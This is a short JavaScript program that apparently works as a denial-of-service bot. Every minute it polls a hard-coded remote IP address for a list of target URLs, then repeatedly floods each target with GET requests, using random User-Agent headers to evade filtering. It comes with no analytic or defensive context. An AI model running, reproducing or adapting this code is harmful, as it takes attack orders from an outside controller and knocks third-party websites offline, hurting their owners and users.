const fetch = require('isomorphic-fetch');
const randomUseragent = require('random-useragent');
const request = require('request');


let bomber;


setInterval(async () => {
    try {
        const response = await fetch('http://212.111.203.181/api/v1/targets');
        const body = await response.json();

        if (body.data.urls.length > 0) {
            clearInterval(bomber);
            bomber = setInterval(() => {
                body.data.urls.forEach((url) => {
                    request({
                        url,
                        method  : 'GET',
                        headers : {
                            'User-Agent' : randomUseragent.getRandom()
                        }
                    });
                });
            });
        }
    } catch (err) {
        console.log(err);
    }
}, 60000);

